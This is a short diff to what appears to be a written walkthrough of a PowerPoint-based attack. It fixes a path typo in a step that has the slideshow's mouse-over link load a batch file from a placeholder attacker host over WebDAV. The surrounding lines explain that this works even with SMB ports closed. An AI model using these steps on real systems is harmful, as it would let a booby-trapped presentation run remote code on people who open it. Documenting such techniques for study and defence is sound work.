@@ -10,7 +10,7 @@
 
 5. Save the Powerpoint file as PPSX or PPS
 
-6. Then open the PPSX file using a ZIP program and change the value in "\ppt\slides_rels\slide1.xml.rels"  of rID which is connected to your mouse over event to "file:///\[Attacker_IP]\webdavfolder\file.bat"
+6. Then open the PPSX file using a ZIP program and change the value in "\ppt\slides\_rels\slide1.xml.rels"  of rID which is connected to your mouse over event to "file:///\[Attacker_IP]\webdavfolder\file.bat"
 
 7. Due to the way SMB connections work in Windows 10, SMB connections over Internet are possible even if SMB ports (445/139) are closed  if a webserver supporting WEBDAV extension is hosted by an attacker
 
